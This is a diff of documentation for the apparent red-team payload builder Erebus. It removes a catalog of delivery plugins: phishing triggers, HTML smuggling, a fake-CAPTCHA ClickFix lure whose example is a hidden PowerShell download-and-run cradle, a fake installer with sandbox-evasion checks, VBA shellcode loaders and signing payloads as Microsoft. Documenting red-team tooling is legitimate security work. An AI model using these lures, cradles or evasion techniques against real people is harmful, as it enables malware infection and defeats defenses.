@@ -7,916 +7,223 @@ pre = "<b>2. </b>"
 
 ## Overview
 
-Erebus uses an extensible plugin system that automatically discovers and loads modules. This architecture allows developers to easily add new functionality without modifying the core builder code. All plugins are stored in the `modules/` directory and are automatically loaded when the builder starts.
-
-## Plugin Architecture
-
-### How It Works
-
-The plugin system consists of three main components:
+Erebus ships most of its build functionality as plugins auto-discovered at startup. The plugin loader scans `erebus/modules/plugin_*.py` for files that inherit from `ErebusPlugin`, instantiates each one, runs its `validate()` hook, and registers every function returned by `register()` into the builder's global namespace so `builder.py` can call them directly. See the `_PLUGIN_FUNCTIONS` list at the top of [builder.py](Payload_Type/erebus_wrapper/erebus_wrapper/erebus/builder.py) for the exact set of plugin-provided functions the builder consumes.
 
-1. **Plugin Base** (`plugin_base.py`) - Defines the abstract interface all plugins must implement
-2. **Plugin Loader** (`plugin_loader.py`) - Automatically discovers, validates, and loads plugins
-3. **Your Plugins** (`plugin_*.py`) - Individual plugin modules providing specific functionality
+This page is the **operator-facing catalog**: what ships, what each plugin does, which BuildParameters it consumes, and what it drops into `payload/`. For authoring your own plugins, see [Plugin Development]({{% relref "plugin-development.md" %}}). For per-plugin tradecraft and hardening notes, see [OPSEC]({{% relref "opsec.md" %}}).
 
-When the builder starts:
-- The plugin loader scans the `modules/` directory for files matching `plugin_*.py`
-- Each plugin is imported, validated, and initialized
-- Plugin functions are registered and made available to the builder
-- Dependencies between plugins are resolved automatically
-
-### Plugin Categories
-
-Plugins are organized into five categories:
-
-#### 🎯 Trigger Plugins
-Create execution triggers for payloads:
-- **LNK Triggers** - Windows shortcut files (.lnk)
-- **BAT Triggers** - Batch script files (.bat)
-- **MSI Triggers** - MSI installer triggers
-- **MSC Triggers** - Windows Management Console snap-in triggers (Explorer-activated)
-- **ClickOnce Triggers** - ClickOnce application triggers
-- **HTML Smuggling** - Self-contained HTML page with XOR+base64 obfuscated payload dropped via in-browser Blob
-- **ClickFix** - Fake CAPTCHA page that copies a command to clipboard and walks the victim through Win+R → Ctrl+V → Enter
-
-#### 📦 Container Plugins  
-Package payloads into container formats:
-- **Archive Containers** - 7z and ZIP archives with password protection
-- **ISO Containers** - ISO disk images with autorun support
-- **MSI Containers** - Windows Installer packages
-- **ClickOnce Containers** - ClickOnce deployment packages
-- **Electron Fake-Installer** - Single portable .exe wizard (Next/Install/Finish) that extracts the embedded loader to `%TEMP%` and spawns it hidden + detached
-
-#### 🛠️ Payload Plugins
-Manipulate or generate payloads:
-- **DLL Proxy** - Generate DLL proxy/hijack code
-- **Obfuscation** - Payload obfuscation techniques
-- **Format Conversion** - Convert between payload formats
-
-#### ✍️ CodeSigner Plugins
-Code signing functionality:
-- **Self-Signing** - Generate and apply self-signed certificates
-- **Certificate Cloning** - Clone certificates from remote URLs
-- **Custom Certificates** - Sign with provided certificates
-
-#### 🔧 Other Plugins
-Utility functions that don't fit other categories
-
-## Available Plugins
-
-### Trigger Plugins
-
-#### LNK Trigger Plugin
-Creates Windows shortcut (.lnk) files that execute payloads.
-
-**Functions:**
-- `create_payload_trigger()` - Create LNK trigger with decoy file support
-- `create_lnk_trigger()` - Create basic LNK trigger
-- `set_file_hidden()` - Hide files on Windows/Linux
-
-**Example Usage:**
-```python
-trigger_path = create_payload_trigger(
-    target_bin="cmd.exe",
-    args="/c start erebus.exe",
-    icon_src=r"C:\Windows\System32\imageres.dll",
-    icon_index=0,
-    description="Invoice",
-    payload_dir=Path("./payload"),
-    decoy_file=Path("./decoy.pdf")
-)
-```
-
-#### BAT Trigger Plugin
-Creates batch script (.bat) files for payload execution.
-
-**Functions:**
-- `create_bat_payload_trigger()` - Generate BAT trigger with payload execution
-
-#### MSI Trigger Plugin
-Creates MSI-based triggers for payload execution.
-
-**Functions:**
-- `create_msi_payload_trigger()` - Generate MSI trigger package
-
-#### ClickOnce Trigger Plugin
-Creates ClickOnce application triggers.
-
-**Functions:**
-- `create_clickonce_trigger()` - Generate ClickOnce deployment trigger
-
-#### MSC Trigger Plugin
-Creates Windows Management Console snap-in (.msc) triggers. MSC files are activated by Explorer/mmc.exe and can chain execution of the loader binary.
-
-**Functions:**
-- `create_msc_explorer_trigger()` - Generate MSC snap-in that spawns the payload
-
-#### HTML Smuggling / ClickFix Plugin
-Single plugin (`plugin_trigger_html_smuggling.py`) providing two browser-delivered triggers. Both produce fully self-contained `.html` files that can be hosted on any webserver or dropped via a phishing link.
-
-**Functions:**
-- `create_html_smuggling_trigger()` - Build an HTML smuggling page with the loader XOR-obfuscated and base64-encoded in JS. A JavaScript decoder reverses both layers at runtime and reconstructs a `Blob`, triggering the browser download without the encoded payload appearing in static HTML scans.
-- `create_clickfix_trigger()` - Build a ClickFix lure page mimicking a CAPTCHA/verification dialog. Clicking the verify button silently copies the configured command (typically a PowerShell download cradle) to the clipboard; on-screen instructions walk the victim through Win+R → Ctrl+V → Enter to execute it.
-
-**HTML Smuggling Features:**
-- XOR key is randomly generated per build (16 bytes) so no two payloads share a decoder footprint
-- Random JS variable identifiers break signature-based detection
-- Optional auto-download delay (default 1500ms) to look like a natural redirect
-- Configurable page title, heading, body text, and download filename (malleable lure content)
-
-**ClickFix Features:**
-- Malleable branding: `brand_name`, `brand_color`, heading/message, per-step instruction text, button label
-- Command string is escaped for safe JS embedding and copied via `navigator.clipboard.writeText`
-- Works on all modern browsers (Chromium, Firefox, Safari) without requiring any plugins or downloads
-- No binary artifact leaves the browser - evades file-based AV entirely; the command executes via user-initiated Run dialog paste
-
-**Example Usage:**
-```python
-# HTML smuggling - drop erebus.exe via Blob download
-html_path = create_html_smuggling_trigger(
-    payload_path="./payload/erebus.exe",
-    output_filename="invoice-viewer.html",
-    download_name="Invoice-Q4.exe",
-    page_title="Invoice Viewer",
-    heading="Loading invoice...",
-    auto_download=True,
-    delay_ms=2000,
-    payload_dir=Path("./payload"),
-)
-
-# ClickFix - clipboard-lure PowerShell cradle
-clickfix_path = create_clickfix_trigger(
-    command='powershell -w hidden -ep bypass -c "iwr -uri https://cdn.example/upd -outfile $env:TEMP\\u.exe; & $env:TEMP\\u.exe"',
-    output_filename="verify.html",
-    brand_name="Cloudflare",
-    brand_color="#f38020",
-    verification_heading="Verify you are human",
-    payload_dir=Path("./payload"),
-)
-```
-
-### Container Plugins
-
-#### Archive Container Plugin
-Creates password-protected 7z and ZIP archives.
-
-**Functions:**
-- `build_7z()` - Create 7z archive with LZMA2 compression
-- `build_zip()` - Create ZIP archive with optional encryption
-
-**Features:**
-- Configurable compression levels (0-9)
-- Optional password protection
-- File attribute manipulation (hide non-trigger files)
-- Header encryption for 7z
-
-**Example Usage:**
-```python
-archive = build_7z(
-    compression="9",
-    password="secret123",
-    build_path=Path("./build"),
-    visible_extension=".lnk"
-)
-```
-
-#### ISO Container Plugin
-Creates ISO disk images for payload delivery.
-
-**Functions:**
-- `build_iso()` - Generate ISO with autorun support
-
-**Features:**
-- Custom volume labels
-- Autorun.inf generation
-- File hiding (Joliet extension)
-- Backdoor existing ISOs
-
-**Example Usage:**
-```python
-iso = build_iso(
-    volume_id="SYSTEM_UPDATE",
-    enable_autorun=True,
-    build_path=Path("./build"),
-    visible_extension=".lnk"
-)
-```
-
-#### MSI Container Plugin
-Creates Windows Installer (MSI) packages.
-
-**Functions:**
-- `build_msi()` - Create custom MSI package
-- `hijack_msi()` - Backdoor existing MSI
-- `add_multiple_files_to_msi()` - Add files to MSI
-
-**Features:**
-- Custom actions and scripts
-- File hijacking
-- Multi-file support
-- Installer toolkit integration
-
-#### ClickOnce Container Plugin
-Creates ClickOnce deployment packages.
-
-**Functions:**
-- `build_clickonce()` - Generate ClickOnce application package
-
-#### Electron Fake-Installer Container Plugin
-Wraps the compiled loader inside a single portable Windows `.exe` built with `electron-builder`. At install time the wizard presents a Welcome → Installing → Finish flow, extracts the embedded loader tree to `%TEMP%\inst-<uuid>`, spawns the configured entry point hidden + detached, and cleans up the temp dir when the child exits.
-
-**Functions:**
-- `build_electron_installer()` - Stage the payload into the Electron project's `extraResources`, rewrite `package.json` + `electron-builder.yml` with operator metadata, convert the icon to multi-size ICO, and produce the final portable exe
-
-**Two build modes:**
-- **In-Container (Wine)** - `npm install` + `electron-builder --win nsis` run inside the Erebus Docker container under wine (for rcedit/winCodeSign). One-step build, no Windows host required.
-- **Deferred (Erebus.Helper)** - the builder stages the Electron project source + `build_electron.bat` into the payload directory. The operator runs the bat on a Windows host with Node.js 20 via `python erebus_helper.py electron ...`.
-
-**Runtime behavior (wizard flow):**
-- Victim double-clicks the portable `.exe`; Electron runtime extracts to temp and launches the fake wizard with the Install button **disabled**
-- Renderer waits for the configured dwell time AND a real `mousemove` (non-zero movementX/Y) before acquiring a one-shot interaction token from the main process via `installer:ready`
-- Once the token is in hand, the Install button becomes actionable
-- "Install" click invokes `installer:run` with the token; the main process handler:
-  1. Re-validates the interaction token (rejects direct IPC invocation that bypasses the UI)
-  2. Runs `runGuardrails()` — debugger / sandbox env / username / hostname / screen / CPU / RAM / idle-time / pre-spawn delay checks
-  3. **Only if both gates pass**, copies `process.resourcesPath/payload/` to `%TEMP%\inst-<uuid>`
-  4. Spawns the configured entry point via `child_process.spawn(..., { detached: true, windowsHide: true, stdio: 'ignore' })`
-  5. Advances the wizard to Finish (guardrail failure is silent — wizard still shows fake progress + Finish, but nothing is copied or spawned)
-  6. Removes the temp dir on the spawned process's `exit` event
-
-**Guardrails (anti-sandbox gating):**
-All guardrails are operator-configurable via the `3.E9*` BuildParameter group and implemented in [src/guardrails.js](Payload_Type/erebus_wrapper/erebus_wrapper/agent_code/Erebus.Loaders/Erebus.Electron/src/guardrails.js). The master switch is `3.E9 Enable Electron Guardrails` (default: on).
-
-| Check | BuildParameter | Default | Behaviour |
-|---|---|---|---|
-| Dwell time | `3.E9a Dwell Time (ms)` | `2500` | Install button disabled until N ms have elapsed since the wizard opened |
-| Mouse movement | `3.E9b Require Mouse Movement` | on | Requires a real non-zero-delta `mousemove` inside the window before Install is actionable |
-| Debugger | `3.E9c Check Debugger` | on | Rejects if `inspector.url()`, `--inspect` arg, or non-zero `process.debugPort` |
-| Sandbox env vars | `3.E9d Check Sandbox Env Vars` | on | Rejects on `SBIEHOME`, `CUCKOO_AGENT`, `JOEBOX_AGENT`, `ANALYST_USERNAME`, `SANDBOXIE_CURRENT_DIR` |
-| Bad usernames | `3.E9e Check Default Bad Usernames` | on | Rejects common sandbox usernames (`sandbox`, `malware`, `analyst`, `WDAGUtilityAccount`, etc.) |
-| Bad hostnames | `3.E9f Check Default Bad Hostnames` | on | Rejects hostnames containing `sandbox`, `cuckoo`, `vbox`, `qemu`, etc. |
-| Hostname whitelist | `3.E9g Hostname Whitelist` | empty | Comma-separated allow-list; only matching hosts can run |
-| Hostname blocklist | `3.E9h Hostname Blocklist` | empty | Comma-separated deny-list |
-| Username whitelist | `3.E9i Username Whitelist` | empty | Comma-separated allow-list |
-| Username blocklist | `3.E9j Username Blocklist` | empty | Comma-separated deny-list |
-| Min screen width/height | `3.E9k`/`3.E9l` | `1280`/`720` | Defeats sandbox VMs that run at 800×600 or 1024×768 |
-| Min CPU count | `3.E9m Min CPU Count` | `2` | Defeats 1-CPU sandbox VMs |
-| Min RAM (MB) | `3.E9n Min Memory (MB)` | `2048` | Defeats low-memory sandbox VMs |
-| Max idle seconds | `3.E9o Max Idle Seconds` | `0` (off) | Rejects if system has been idle > N seconds (unattended box = suspicious) |
-| Pre-spawn delay | `3.E9p Pre-Spawn Delay (ms)` | `0` (off) | Sleeps N ms after all checks pass but before the file copy — forces short-lived detonation windows to time out |
-
-Guardrail failures are **silent**: the wizard still shows fake progress → Finish so a sandbox observer sees a "successful" install with no actual loader execution. The loader tree is never written to `%TEMP%\inst-<uuid>` when any enabled check fails.
-
-**Supported entry formats:**
-- `exe` - `CreateProcess` on the embedded PE directly
-- `dll` - `rundll32.exe <dll>,<entry>` (configurable export name)
-- `xll` - `excel.exe /e <xll>` (Excel add-in activation path)
-
-**PE resource fields (Windows Properties → Details tab):**
-All fields are driven by build parameters and baked into the portable exe via electron-builder's rcedit pass:
-
-| Windows field | BuildParameter | Source |
-|---|---|---|
-| File description | `3.E7 Electron File Description` | `package.json.description` |
-| Product name | `3.E0 Electron Product Name` | `electron-builder.yml.productName` |
-| Product version | `3.E2 Electron Version` | `package.json.version` |
-| File version | `3.E2 Electron Version` | `package.json.version` |
-| Copyright | `3.E8 Electron Copyright` | `electron-builder.yml.copyright` |
-| Company | `3.E1 Electron Publisher` | `package.json.author` |
-
-**Icon customisation:**
-- Operators can upload a custom PNG/JPEG/GIF/BMP/WEBP/TIFF/**SVG** via `3.E6a Electron Custom Icon`
-- SVG inputs are auto-rasterized to 512×512 via `cairosvg` before Pillow conversion
-- Pillow produces a multi-resolution ICO (16/24/32/48/64/128/256) embedded in the final exe's PE resource table
-- When no upload is provided, the vendored Erebus icon is used
-
-**Dependencies:**
-- Node.js 20 LTS + npm (in the Erebus Docker image for In-Container mode)
-- `wine`, `wine32`, `wine64` (for electron-builder's rcedit/winCodeSign calls under Linux)
-- `Pillow` (PNG → ICO conversion)
-- `cairosvg` + `libcairo2` (SVG → PNG rasterization)
-- `electron` + `electron-builder` (vendored per-project via npm)
-
-**Example Usage:**
-```python
-installer = build_electron_installer(
-    build_path=Path(agent_build_path),
-    product="AcmeCorp Field Services 2024",
-    publisher="AcmeCorp Industries Ltd",
-    version="8.3.1",
-    arch="x64",
-    entry_format="exe",
-    entry_name="erebus.exe",
-    build_mode="In-Container (Wine)",
-    file_description="AcmeCorp Remote Assistance Installer",
-    copyright_str="(C) 2024 AcmeCorp Industries Ltd. All rights reserved.",
-    custom_icon_bytes=None,  # or raw PNG/SVG bytes from operator upload
-)
-```
-
-**erebus_helper CLI (deferred Windows build):**
-```
-# Build the Electron portable exe on a Windows host
-python erebus_helper.py electron --project-dir electron_src --output ErebusInstaller.exe --arch x64
-
-# Optional AuthentiCode signing via electron-builder's CSC_LINK
-python erebus_helper.py electron --project-dir electron_src --output ErebusInstaller.exe \
-    --sign-cert mycert.pfx --sign-password hunter2
-```
-
-### Payload Plugins
-
-#### DLL Proxy Plugin
-Generates DLL proxy/hijack code for DLL sideloading.
-
-**Functions:**
-- `generate_proxies()` - Generate proxy functions for DLL hijacking
-
-**Features:**
-- Automatic export parsing
-- C/C++ proxy generation
-- Function forwarding
-
-#### MalDocs (Excel) Plugin
-Creates or backdoors Excel documents (XLSM/XLAM/XLS) with embedded VBA payloads, or exports VBA modules for manual import. The builder compiles XLSM/XLSX files directly on Linux using templates from `agent_code/templates/` and a built-in VBA project compiler (`agent_code/vba_compiler/`). Optional Windows-side COM re-injection via `erebus_helper` is available for higher-fidelity output.
-
-**Functions:**
-- `generate_excel_payload()` - Create a new XLSM with embedded VBA payload
-- `backdoor_existing_excel()` - Inject VBA payload into an existing Excel file
-- `export_vba_as_bas()` - Export VBA as .bas module file (importable into Excel)
-- `export_vba_as_text()` - Export VBA as plain text for reference
-- `generate_command_execution_vba()` - VBA macro for trigger-binary execution with dynamic payload discovery
-- `generate_vba_loader_createthread()` - Classic VirtualAlloc + CreateThread loader
-- `generate_vba_loader_enumlocales()` - EnumSystemLocalesA callback technique
-- `generate_vba_loader_queueuserapc()` - QueueUserAPC injection technique
-- `generate_vba_loader_process_hollowing()` - Process hollowing (notepad.exe host)
-- `generate_xll_template()` - Generate XLL (Excel Add-In DLL) C/C++ source template
-- `register_xll_function()` - Register an XLL exported function
-
-**Output Modes**
-
-**VBA Module Only**
-   - Exports as a `.bas` file that can be imported into any Excel document
-   - Import: Excel → Alt+F11 → File → Import → Select .bas file
-   - Maximum flexibility - works with any Excel document
-   - Generates both `.bas` (importable) and `.txt` (reference) files
-
-**Create / Backdoor Excel** (XLSM / XLSX / XLAM)
-   - Produces a complete Excel workbook with the VBA payload embedded directly on Linux
-   - Uses templates from `agent_code/templates/` (template.xlsm / template.xlsx) as the base document
-   - VBA project compiled into a valid `vbaProject.bin` via `agent_code/vba_compiler/` (MS-OVBA spec compliant)
-   - `build_maldoc.bat` included for optional Windows-side COM re-injection via `erebus_helper`
-   - When "Backdoor Existing" is selected without uploading a file, the template is used automatically
-
-**XLL Add-In DLL**
-   - Compiles a native Windows DLL that Excel loads automatically via the `.xll` extension
-   - Supports MSVC and MinGW compilers with selectable injection method (CreateThread in-process, ProcessInject remote)
-   - Custom guardrail code and extra linker flags are supported
-   - Requires `erebus_helper` on a Windows host for compilation
-
-**VBA Loader Techniques (Shellcode Injection mode):**
-
-| Technique | Detection Profile | Notes |
-|-----------|-------------------|-------|
-| **VirtualAlloc + CreateThread** | High | Most compatible; works on all Office versions |
-| **EnumSystemLocalesA Callback** | Medium | Bypasses some static analysis tools |
-| **QueueUserAPC Injection** | Medium-Low | No explicit thread creation |
-| **Process Hollowing** | Medium-High | Remote injection into a suspended process; highest isolation |
-
-**Dynamic Payload Discovery (Command Execution mode)**
-
-When the MalDoc is configured for command execution, the generated VBA does not rely on a hardcoded full path. Instead, `FindPayload` searches common filesystem locations at runtime to resolve the payload filename before constructing the shell command:
-
-1. `ThisWorkbook.Path` - same directory as the opened document (checked first)
-2. `%TEMP%` / `%TMP%`
-3. `%APPDATA%` / `%LOCALAPPDATA%`
-4. `%USERPROFILE%\Desktop`, `\Downloads`, `\Documents`
-5. `%USERPROFILE%` root
-6. `%OneDrive%\Desktop`, `\Downloads`, `\Documents`
-
-Both a direct FSO existence check and a recursive subfolder search (`RecursiveSearch`) are performed per candidate. If no match is found the original configured path is used as a fallback.
-
-A `StackSearch` (iterative, BFS via Collection stack) utility function is also included in the generated VBA for use cases where deep folder trees make recursion impractical.
-
-**Features:**
-- Supports XLSM/XLAM/XLS inputs
-- Multiple execution triggers (AutoOpen, OnClose, OnSave)
-- Optional VBA obfuscation
-- Command execution (WScript.Shell) or direct shellcode injection
-- Selectable shellcode loader technique
-- Direct .bas module export for maximum compatibility
-- Path quoting in shell commands (`Chr(34)`) to handle paths with spaces
-- Existence guard before execution - macro exits silently if the payload is not found
-
-**Requirements:**
-- `openpyxl` (required for Excel manipulation on Linux)
-- `ms-ovba-compression` (optional, improves VBA project compilation; built-in fallback available)
-- `pywin32` + Microsoft Excel (optional, for Windows-side COM re-injection)
-
-**Build Step:**
-- The builder compiles the XLSM/XLSX directly on Linux using the template and the VBA project compiler
-- A `.bas` file and `build_maldoc.bat` are included for optional Windows-side COM re-injection via `erebus_helper`
-
-**Example Usage:**
-```python
-# Create Excel with VirtualAlloc loader
-excel_path = generate_excel_payload(
-    payload_path="./payload",
-    vba_payload=vba_code,
-    output_path="./payload/Invoice.xlsm"
-)
-
-# Generate command-execution macro (dynamic payload discovery included automatically)
-vba_code = plugin.generate_command_execution_vba(
-    trigger_binary="C:\\Windows\\SysWOW64\\regsvr32.exe",
-    trigger_command="erebus.dll",   # searched for by name at runtime
-    trigger_type="AutoOpen"
-)
-
-# Generate specific shellcode loader technique
-vba_code = plugin.generate_vba_loader_enumlocales(
-    vba_shellcode=shellcode,
-    trigger_type="AutoOpen"
-)
-```
-
-**erebus_helper CLI (Windows-side injection)**
-```
-# Inject VBA into a new blank workbook
-python erebus_helper.py xlsm --bas-file Invoice.bas --output Invoice.xlsm
-
-# Backdoor an existing workbook
-python erebus_helper.py xlsm --bas-file Invoice.bas --source-excel template.xlsx --output Invoice.xlsm
-
-# Generate an XLAM add-in
-python erebus_helper.py xlam --bas-file Invoice.bas --output Invoice.xlam
-
-# Compile an XLL add-in DLL
-python erebus_helper.py xll --source xll_payload.cpp --output Invoice.xll --compiler MSVC
-```
-
-### CodeSigner Plugins
-
-#### CodeSigner Plugin
-Provides code signing capabilities.
-
-**Functions:**
-- `self_sign_payload()` - Generate and apply self-signed certificate
-- `get_remote_cert_details()` - Extract certificate info from URL
-- `sign_with_provided_cert()` - Sign with custom certificate
-
-**Features:**
-- Self-signed certificate generation
-- Certificate cloning from remote hosts
-- Custom certificate support (.pfx/.p12)
-- Full X.509 attribute support
-
-**Example Usage:**
-```python
-# Self-sign a payload
-self_sign_payload(
-    payload_path=Path("erebus.exe"),
-    subject_cn="Microsoft Corporation",
-    org_name="Microsoft"
-)
-
-# Clone certificate from URL
-cert_details = get_remote_cert_details("https://example.com")
-self_sign_payload(
-    payload_path=Path("erebus.exe"),
-    subject_cn=cert_details["CN"],
-    org_name=cert_details["O"],
-    full_details=cert_details
-)
-```
-
-## Creating Custom Plugins
-
-### Quick Start
-
-1. **Copy the template:**
-   ```bash
-   cd modules/
-   cp plugin_example.py.template plugin_my_feature.py
-   ```
-
-2. **Edit the plugin:**
-   - Update class name and metadata
-   - Implement your functions
-   - Register functions in `register()` method
-
-3. **Test and deploy:**
-   - Run `python plugin_my_feature.py` to test
-   - Save in `modules/` directory - it's automatically discovered!
-
-### Plugin Template Structure
-
-```python
-try:
-    from .plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
-except ImportError:
-    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
-
-class MyFeaturePlugin(ErebusPlugin):
-    def get_metadata(self) -> PluginMetadata:
-        return PluginMetadata(
-            name="my_feature",
-            version="1.0.0",
-            author="Your Name",
-            description="Description of functionality",
-            category=PluginCategory.CONTAINER,
-            enabled=True
-        )
-    
-    def register(self) -> Dict[str, Callable]:
-        return {
-            "my_function": self.my_function,
-        }
-    
-    def validate(self) -> tuple[bool, Optional[str]]:
-        # Check dependencies
-        return (True, None)
-    
-    def my_function(self, param1, param2):
-        # Implementation
-        pass
-```
-
-### Required Methods
-
-Every plugin must implement:
-
-- **`get_metadata()`** - Return plugin information
-- **`register()`** - Register callable functions
-
-### Optional Methods
-
-Plugins can optionally implement:
-
-- **`validate()`** - Validate dependencies and configuration
-- **`on_load()`** - Initialization when plugin loads
-- **`on_unload()`** - Cleanup when plugin unloads
-- **`get_dependencies()`** - List required plugins
-- **`get_config_schema()`** - Define configuration options
-
-## Plugin Development Best Practices
-
-### 1. Clear Naming
-Use descriptive names for plugins and functions:
-- ✅ `plugin_iso_container.py` → `IsoContainerPlugin` → `build_iso()`
-- ❌ `plugin1.py` → `Plugin` → `do_stuff()`
-
-### 2. Comprehensive Documentation
-Document all functions with docstrings:
-```python
-def build_archive(self, payload_path: Path, compression: int = 9) -> Path:
-    """
-    Create a compressed archive.
-    
-    Args:
-        payload_path: Path to payload file
-        compression: Compression level 0-9 (default: 9)
-        
-    Returns:
-        Path to created archive
-        
-    Raises:
-        RuntimeError: If archive creation fails
-    """
-```
-
-### 3. Error Handling
-Provide clear error messages:
-```python
-try:
-    result = self._process(input_path)
-    if not result.exists():
-        raise RuntimeError("Processing failed")
-    return result
-except Exception as e:
-    raise RuntimeError(f"Failed to process {input_path.name}: {e}")
-```
-
-### 4. Path Management
-Use configurable paths with sensible defaults:
-```python
-def __init__(self):
-    super().__init__()
-    self.REPO_ROOT = Path(__file__).resolve().parents[2]
-    self.AGENT_CODE = self.REPO_ROOT / "agent_code"
-
-def process(self, build_path: Optional[Path] = None):
-    root = build_path if build_path else self.AGENT_CODE
-    output = root / "results"
-    output.mkdir(parents=True, exist_ok=True)
-```
-
-### 5. Validation
-Check dependencies in `validate()`:
-```python
-def validate(self) -> tuple[bool, Optional[str]]:
-    try:
-        import required_package
-        if not (self.AGENT_CODE / "required_file").exists():
-            return (False, "Missing required file")
-        return (True, None)
-    except ImportError as e:
-        return (False, f"Missing dependency: {e}")
-```
-
-## Plugin Loading Process
-
-1. **Discovery** - Scan `modules/` for `plugin_*.py` files
-2. **Import** - Import each plugin module
-3. **Instantiate** - Create plugin instance
-4. **Validate** - Run `validate()` check
-5. **Dependencies** - Resolve plugin dependencies
-6. **Register** - Make functions available
-7. **Initialize** - Call `on_load()` hook
-
-## Troubleshooting
-
-### Plugin Not Loading
-
-**Symptoms:** Plugin doesn't appear in loaded plugins list
-
-**Solutions:**
-- Ensure filename matches `plugin_*.py` pattern
-- Verify class inherits from `ErebusPlugin`
-- Check `enabled=True` in metadata
-- Review console for error messages
-- Verify `validate()` returns `(True, None)`
-
-### Function Not Found
-
-**Symptoms:** `AttributeError` when calling plugin function
-
-**Solutions:**
-- Check function is registered in `register()` method
-- Verify function name spelling
-- Ensure plugin loaded successfully
-
-### Import Errors
-
-**Symptoms:** `ImportError` or `ModuleNotFoundError`
-
-**Solutions:**
-- Use relative imports: `from .plugin_base import ...`
-- Verify dependencies are installed
-- Implement `validate()` to check dependencies
-
-## Advanced Topics
-
-### Plugin Dependencies
-
-Plugins can depend on other plugins:
-
-```python
-def get_dependencies(self) -> List[str]:
-    return ["codesigner"]  # Requires codesigner plugin
-```
-
-### Plugin Configuration
-
-Define configuration schema:
-
-```python
-def get_config_schema(self) -> Optional[Dict[str, Any]]:
-    return {
-        "type": "object",
-        "properties": {
-            "max_size": {
-                "type": "integer",
-                "description": "Maximum file size in bytes"
-            }
-        }
-    }
-```
-
-### Testing Plugins
-
-Test plugins standalone:
-
-```bash
-python modules/plugin_my_feature.py
-```
-
-Or programmatically:
-
-```python
-if __name__ == "__main__":
-    plugin = MyFeaturePlugin()
-    metadata = plugin.get_metadata()
-    print(f"Testing {metadata.name}...")
-    
-    is_valid, error = plugin.validate()
-    assert is_valid, f"Validation failed: {error}"
-    
-    result = plugin.my_function(test_input)
-    assert result.exists(), "Output not created"
-    
-    print("✓ All tests passed!")
-```
-
-## Additional Resources
-
-- **Plugin Template:** `modules/plugin_example.py.template`
-- **Example Plugin:** `modules/plugin_archive_container.py`
-- **Development Guide:** `modules/PLUGIN_DEVELOPMENT.md`
-- **Plugin Base:** `modules/plugin_base.py`
-- **Plugin Loader:** `modules/plugin_loader.py`
-
-## Plugin Validation System
-
-### Automatic Plugin Testing
-
-All plugins are automatically tested when the modules package is imported. Each plugin's `__init__.py` runs a comprehensive validation suite that:
-
-1. **Discovers all plugins** - Scans the `modules/` directory for `plugin_*.py` files
-2. **Validates each plugin** - Runs the plugin's validation test
-3. **Reports results** - Displays pass/fail status for each plugin
-4. **Sends Mythic RPC** - Optionally reports validation status to Mythic operation log
-
-### Standardized Plugin Test Block
-
-Every plugin now includes a standardized test block that runs when the plugin file is executed directly:
-
-```python
-if __name__ == "__main__":
-    _plugin = YourPluginName()
-    _metadata = _plugin.get_metadata()
-    print(f"[*] {_metadata.name} v{_metadata.version}")
-    print(f"[*] Category: {_metadata.category.value}")
-    print(f"[*] Description: {_metadata.description}")
-    print()
-    
-    # Display all registered functions
-    registered = _plugin.register()
-    registered_names = sorted(registered.keys()) if registered else []
-    print(f"[*] Registered functions ({len(registered_names)}):")
-    for func_name in registered_names:
-        print(f"    - {func_name}")
-    print()
-    
-    is_valid, error = _plugin.validate()
-    if is_valid:
-        print("[+] Validation passed")
-    else:
-        print(f"[-] Validation failed: {error}")
-```
-
-### Testing a Single Plugin
-
-To test an individual plugin:
-
-```bash
-cd erebus_wrapper/Payload_Type/erebus_wrapper/erebus_wrapper/erebus/modules
-python plugin_your_plugin_name.py
-```
-
-**Output:**
-```
-[*] Your Plugin Name v1.0.0
-[*] Category: payload
-[*] Description: Brief description of plugin functionality
-
-[*] Registered functions (3):
-    - function_name_1
-    - function_name_2
-    - function_name_3
-
-[+] Validation passed
-```
-
-### Viewing Plugin System Validation
-
-To view the complete plugin validation report:
-
-```bash
-cd erebus_wrapper/Payload_Type/erebus_wrapper/erebus_wrapper/erebus/modules
-python __init__.py
-```
-
-**Output:**
-```
-[*] Initializing Erebus Plugin System...
-[*] Plugin Validation: 10/11 passed
-    [+] plugin_archive_container
-    [+] plugin_container_clickonce
-    ...
-    [-] plugin_payload_maldocs: openpyxl not found - required for advanced Excel manipulation
-[!] Warning: 1 plugin(s) failed validation
-```
-
-### Mythic RPC Integration
-
-The plugin validation system can automatically report results to Mythic's operation event log. This is useful for tracking plugin health during development or in operational environments.
-
-#### Python RPC Call (Equivalent to Go Example)
-
-**Go Original:**
-```go
-mythicrpc.SendMythicRPCOperationEventLogCreate(mythicrpc.MythicRPCOperationEventLogCreateMessage{
-    OperationId:  &input.OperationID,
-    Message:      "Your message here",
-    MessageLevel: mythicrpc.MESSAGE_LEVEL_WARNING,
-})
-```
-
-**Python Equivalent:**
-```python
-from erebus_wrapper.erebus.modules import report_validation_results
-
-# In an async context (e.g., within builder.py):
-await report_validation_results(operation_id=input.OperationID)
-```
-
-#### Using the Plugin Validation API
-
-```python
-from erebus_wrapper.erebus.modules import (
-    get_initialization_results,
-    get_validated_plugins,
-    get_failed_plugins,
-    report_validation_results
-)
-
-# Get validation results
-results = get_initialization_results()
-print(f"Passed: {results['passed_count']}/{results['total']}")
-print(f"Failed: {results['failed_count']}")
-
-# Get specific plugin statuses
-passed_plugins = get_validated_plugins()
-failed_plugins = get_failed_plugins()
-
-# Report to Mythic (async)
-await report_validation_results(operation_id=1234)
-```
-
-#### Example Integration in builder.py
-
-```python
-import asyncio
-from mythic_container.PayloadBuilder import *
-from erebus_wrapper.erebus.modules import report_validation_results
-
-class ErebusBuilder(PayloadBuilder):
-    async def build(self) -> PayloadBuildStatus:
-        try:
-            # ... build logic ...
-            
-            # Report plugin health to Mythic
-            await report_validation_results(operation_id=self.operation_id)
-            
-            return PayloadBuildStatus(success=True, payload=output)
-        except Exception as e:
-            # Report failure
-            await report_validation_results(operation_id=self.operation_id)
-            return PayloadBuildStatus(success=False, error=str(e))
-```
-
-## Plugin Metadata and Registration
-
-### Metadata Structure
-
-All plugins expose metadata via the `get_metadata()` method:
-
-```python
-PluginMetadata(
-    name="plugin_friendly_name",
-    version="1.0.0",
-    category=PluginCategory.PAYLOAD,  # or CONTAINER, TRIGGER, CODESIGNER, etc.
-    description="Human-readable description of plugin functionality",
-    author="Your Name/Organization"
-)
-```
-
-### Registered Functions
-
-Plugins must implement a `register()` method that returns a dictionary mapping function names to callables:
-
